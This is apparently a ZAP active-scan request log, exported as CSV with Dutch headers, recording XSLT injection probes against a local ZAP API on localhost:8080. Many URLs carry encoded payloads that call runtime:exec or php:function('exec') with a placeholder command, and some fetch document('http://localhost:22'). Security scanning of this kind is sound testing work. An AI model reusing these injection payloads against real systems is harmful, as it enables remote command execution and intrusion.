ID,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
516940,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1313
516941,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,1,565,1357
516942,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationCredentials/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E&userId=ZAP,200,OK,1,565,1345
516943,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%3C&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516944,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationCredentialsConfigParams/override?apikey=ZAP&contextId=%3C,200,OK,1,565,1271
516945,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3C&contextId=ZAP,400,Bad Request,1,572,12
516946,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516947,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationCredentials/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&userId=ZAP,200,OK,1,565,1344
516948,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,0,565,1357
516949,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,1,565,1313
516950,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP,400,Bad Request,1,572,12
516951,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1357
516952,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516953,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationCredentialsConfigParams/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1271
516954,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3C&contextId=ZAP&userId=ZAP,400,Bad Request,0,572,12
516955,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516956,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationCredentialsConfigParams/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1271
516957,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP,400,Bad Request,1,572,12
516958,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1357
516959,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,1,565,1313
516960,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=ZAP&contextId=%3C&userId=ZAP,200,OK,1,565,1357
516961,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationCredentialsConfigParams/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1271
516962,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,12
516963,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516964,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&userId=ZAP,200,OK,1,565,1357
516965,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%3C&contextId=ZAP,200,OK,0,565,1187
516966,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,12
516967,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516968,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1313
516969,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP,400,Bad Request,1,572,12
516970,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516971,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,12
516972,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&contextId=ZAP,200,OK,0,565,1186
516973,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP,400,Bad Request,1,572,12
516974,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E&userId=ZAP,200,OK,1,565,1357
516975,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP&userId=ZAP,400,Bad Request,0,572,12
516976,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&contextId=ZAP,200,OK,0,565,1187
516977,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1276
516978,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP,200,OK,0,565,1187
516979,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1313
516980,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=ZAP&contextId=%3C&userId=ZAP,200,OK,1,565,1276
516981,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,12
516982,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationSession/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&userId=ZAP,200,OK,0,565,1357
516983,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP,400,Bad Request,1,572,12
516984,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&userId=ZAP,200,OK,1,565,1276
516985,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,200,OK,1,565,1313
516986,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&contextId=ZAP,200,OK,0,565,1187
516987,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP,400,Bad Request,1,572,12
516988,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3C&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
516989,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E&userId=ZAP,200,OK,1,565,1276
516990,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,1,572,12
516991,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getUserById/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&userId=ZAP,200,OK,0,565,1276
516992,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
516993,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP,400,Bad Request,1,572,12
516994,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3C&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
516995,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&contextId=ZAP,200,OK,1,565,1187
516996,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=ZAP&contextId=%3C&userId=ZAP,200,OK,1,565,1313
516997,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
516998,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&contextId=ZAP,200,OK,0,565,1187
516999,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=%3C,400,Bad Request,1,572,12
517000,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517001,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP&userId=ZAP,400,Bad Request,0,572,12
517002,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517003,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&contextId=ZAP,200,OK,1,565,1187
517004,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&userId=ZAP,200,OK,1,565,1313
517005,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=%3C&userId=ZAP,400,Bad Request,1,572,12
517006,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517007,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%3C&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1460
517008,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,400,Bad Request,1,572,12
517009,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517010,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&userId=ZAP,400,Bad Request,1,572,12
517011,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E,400,Bad Request,0,572,12
517012,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E&userId=ZAP,200,OK,0,565,1313
517013,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=ZAP&contextId=%3C,200,OK,0,565,1187
517014,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517015,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E&userId=ZAP,400,Bad Request,1,572,12
517016,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/getAuthenticationState/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&userId=ZAP,200,OK,0,565,1313
517017,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517018,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1460
517019,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&userId=ZAP,400,Bad Request,1,572,12
517020,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%3C&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1256
517021,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
